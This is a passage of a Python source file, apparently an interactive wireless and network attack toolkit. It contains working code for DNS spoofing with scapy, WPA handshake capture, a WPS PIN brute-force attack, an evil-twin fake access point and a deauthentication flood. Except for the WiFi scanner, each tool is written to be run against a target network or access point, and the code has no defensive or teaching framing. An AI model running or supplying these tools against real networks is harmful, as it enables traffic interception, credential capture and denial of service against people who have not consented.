        interface = input(f"{Colors.YELLOW}Enter network interface:{Colors.RESET} ")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting DNS spoofer (Ctrl+C to stop)")
        
        def dns_callback(packet):
            if packet.haslayer(scapy.DNSQR):
                domain = packet[scapy.DNSQR].qname.decode()
                if target_domain in domain:
                    print(f"{Colors.GREEN}[+]{Colors.RESET} Spoofing DNS request for {domain}")
                    
                    spoofed_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst)/\
                                 scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport)/\
                                 scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd,\
                                 an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, ttl=10, rdata=spoof_ip))
                    
                    scapy.send(spoofed_pkt, iface=interface, verbose=0)
        
        try:
            scapy.sniff(prn=dns_callback, filter="udp port 53", store=0)
        except KeyboardInterrupt:
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} DNS spoofer stopped.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class WiFiScanner:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}WiFi Scanner:{Colors.RESET}")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!]{Colors.RESET} This tool requires root privileges.")
            input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")
            return
        
        interface = input(f"{Colors.YELLOW}Enter wireless interface (e.g., wlan0):{Colors.RESET} ")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting WiFi scan (Ctrl+C to stop)")
        
        def scan_networks():
            try:
                output = subprocess.check_output(["iwlist", interface, "scan"], stderr=subprocess.STDOUT, text=True)
                cells = []
                current_cell = {}
                
                for line in output.split('\n'):
                    line = line.strip()
                    
                    if "Cell" in line and "Address:" in line:
                        if current_cell:
                            cells.append(current_cell)
                        current_cell = {}
                        current_cell["mac"] = line.split("Address: ")[1]
                    
                    elif "ESSID:" in line:
                        current_cell["ssid"] = line.split('"')[1]
                    
                    elif "Frequency:" in line:
                        current_cell["channel"] = line.split("Channel ")[1].split(")")[0]
                    
                    elif "Quality=" in line:
                        parts = line.split("  ")
                        current_cell["signal"] = parts[0].split("=")[1].split("/")[0]
                        current_cell["quality"] = parts[1].split("=")[1]
                    
                    elif "Encryption key:" in line:
                        current_cell["encryption"] = line.split(":")[1].strip()
                    
                    elif "IE: IEEE 802.11i/WPA2" in line:
                        current_cell["encryption"] = "WPA2"
                
                if current_cell:
                    cells.append(current_cell)
                
                return cells
            
            except subprocess.CalledProcessError as e:
                print(f"{Colors.RED}[!]{Colors.RESET} Error scanning networks: {e.output}")
                return []
        
        try:
            while True:
                networks = scan_networks()
                os.system('clear' if os.name == 'posix' else 'cls')
                Banner.display()
                print(f"{Colors.WHITE}Available WiFi Networks:{Colors.RESET}")
                
                if not networks:
                    print(f"{Colors.RED}[-]{Colors.RESET} No networks found")
                else:
                    print(f"{Colors.CYAN}{'SSID':<20} {'MAC':<18} {'Channel':<8} {'Signal':<6} {'Encryption':<10}{Colors.RESET}")
                    for network in networks:
                        ssid = network.get("ssid", "Hidden")
                        mac = network.get("mac", "Unknown")
                        channel = network.get("channel", "?")
                        signal = network.get("signal", "?")
                        encryption = network.get("encryption", "?")
                        
                        print(f"{ssid:<20} {mac:<18} {channel:<8} {signal:<6} {encryption:<10}")
                
                print(f"\n{Colors.BLUE}[*]{Colors.RESET} Scanning... (Ctrl+C to stop)")
                time.sleep(5)
        
        except KeyboardInterrupt:
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} WiFi scan stopped.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class WPAHandshakeCapture:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}WPA Handshake Capture:{Colors.RESET}")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!]{Colors.RESET} This tool requires root privileges.")
            input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")
            return
        
        interface = input(f"{Colors.YELLOW}Enter wireless interface (e.g., wlan0):{Colors.RESET} ")
        bssid = input(f"{Colors.YELLOW}Enter target BSSID (MAC address):{Colors.RESET} ")
        channel = input(f"{Colors.YELLOW}Enter channel number:{Colors.RESET} ")
        output_file = input(f"{Colors.YELLOW}Enter output file name (without extension):{Colors.RESET} ")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting handshake capture (Ctrl+C to stop)")
        
        try:
            # Set interface to monitor mode
            subprocess.run(["airmon-ng", "check", "kill"], check=True)
            subprocess.run(["ip", "link", "set", interface, "down"], check=True)
            subprocess.run(["iw", interface, "set", "monitor", "control"], check=True)
            subprocess.run(["ip", "link", "set", interface, "up"], check=True)
            subprocess.run(["iwconfig", interface, "channel", channel], check=True)
            
            # Start capturing
            cmd = ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", output_file, interface]
            process = subprocess.Popen(cmd)
            
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} Waiting for handshake...")
            print(f"{Colors.YELLOW}You may need to force clients to reconnect (deauth attack){Colors.RESET}")
            
            process.wait()
            
        except subprocess.CalledProcessError as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Error: {str(e)}")
        except KeyboardInterrupt:
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} Stopping capture...")
            process.terminate()
            
            # Restore interface
            subprocess.run(["ip", "link", "set", interface, "down"], check=True)
            subprocess.run(["iw", interface, "set", "type", "managed"], check=True)
            subprocess.run(["ip", "link", "set", interface, "up"], check=True)
            subprocess.run(["service", "NetworkManager", "restart"], check=True)
            
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} Capture stopped. Check for .cap file")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class WPSPINAttack:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}WPS PIN Attack:{Colors.RESET}")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!]{Colors.RESET} This tool requires root privileges.")
            input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")
            return
        
        interface = input(f"{Colors.YELLOW}Enter wireless interface (e.g., wlan0):{Colors.RESET} ")
        bssid = input(f"{Colors.YELLOW}Enter target BSSID (MAC address):{Colors.RESET} ")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting WPS PIN attack (Ctrl+C to stop)")
        
        try:
            cmd = ["reaver", "-i", interface, "-b", bssid, "-vv", "-K", "1"]
            process = subprocess.Popen(cmd)
            process.wait()
        
        except KeyboardInterrupt:
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} Stopping attack...")
            process.terminate()
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} Attack stopped.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class EvilTwinAttack:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}Evil Twin Attack:{Colors.RESET}")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!]{Colors.RESET} This tool requires root privileges.")
            input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")
            return
        
        interface = input(f"{Colors.YELLOW}Enter wireless interface (e.g., wlan0):{Colors.RESET} ")
        ssid = input(f"{Colors.YELLOW}Enter SSID to mimic:{Colors.RESET} ")
        channel = input(f"{Colors.YELLOW}Enter channel number:{Colors.RESET} ")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Setting up evil twin (Ctrl+C to stop)")
        
        try:
            # Set up access point
            subprocess.run(["airmon-ng", "check", "kill"], check=True)
            subprocess.run(["ip", "link", "set", interface, "down"], check=True)
            subprocess.run(["iwconfig", interface, "mode", "master"], check=True)
            subprocess.run(["ip", "link", "set", interface, "up"], check=True)
            subprocess.run(["iwconfig", interface, "channel", channel], check=True)
            subprocess.run(["iwconfig", interface, "essid", ssid], check=True)
            
            # Start DHCP server
            subprocess.run(["dnsmasq", "-C", "/etc/dnsmasq.conf", "--interface="+interface], check=True)
            
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} Evil twin running for SSID: {ssid}")
            print(f"{Colors.YELLOW}Clients connecting will be served by your fake AP{Colors.RESET}")
            
            while True:
                time.sleep(1)
        
        except subprocess.CalledProcessError as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Error: {str(e)}")
        except KeyboardInterrupt:
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} Stopping evil twin...")
            
            # Clean up
            subprocess.run(["pkill", "dnsmasq"], check=True)
            subprocess.run(["ip", "link", "set", interface, "down"], check=True)
            subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
            subprocess.run(["ip", "link", "set", interface, "up"], check=True)
            subprocess.run(["service", "NetworkManager", "restart"], check=True)
            
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} Evil twin stopped.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class DeauthAttack:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}Deauthentication Attack:{Colors.RESET}")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!]{Colors.RESET} This tool requires root privileges.")
            input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")
            return
        
        interface = input(f"{Colors.YELLOW}Enter wireless interface (e.g., wlan0):{Colors.RESET} ")
        bssid = input(f"{Colors.YELLOW}Enter target BSSID (MAC address):{Colors.RESET} ")
        client = input(f"{Colors.YELLOW}Enter client MAC (leave empty for broadcast):{Colors.RESET} ")
        count = input(f"{Colors.YELLOW}Enter number of packets (0 for continuous):{Colors.RESET} ")
        
        if not client:
            client = "ff:ff:ff:ff:ff:ff"
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting deauth attack (Ctrl+C to stop)")
        
        try:
            if count == "0":
                cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", client, interface]
            else:
                cmd = ["aireplay-ng", "--deauth", count, "-a", bssid, "-c", client, interface]
            
            process = subprocess.Popen(cmd)
            process.wait()
        
        except KeyboardInterrupt:
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} Stopping attack...")
            process.terminate()
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} Attack stopped.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

if __name__ == "__main__":
    try:
        # Check for root privileges for certain operations
        if os.geteuid() != 0:
            print(f"{Colors.YELLOW}[!]{Colors.RESET} Some features require root privileges")
        
        # Check for required dependencies
        try:
            import scapy.all
        except ImportError:
            print(f"{Colors.RED}[!]{Colors.RESET} Scapy not installed. Install with: pip install scapy")
            sys.exit(1)
        
        Menu.main_menu()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!]{Colors.RESET} Interrupted by user")
        sys.exit(0)
    
    except Exception as e:
        print(f"\n{Colors.RED}[!]{Colors.RESET} Error: {str(e)}")
        sys.exit(1)
        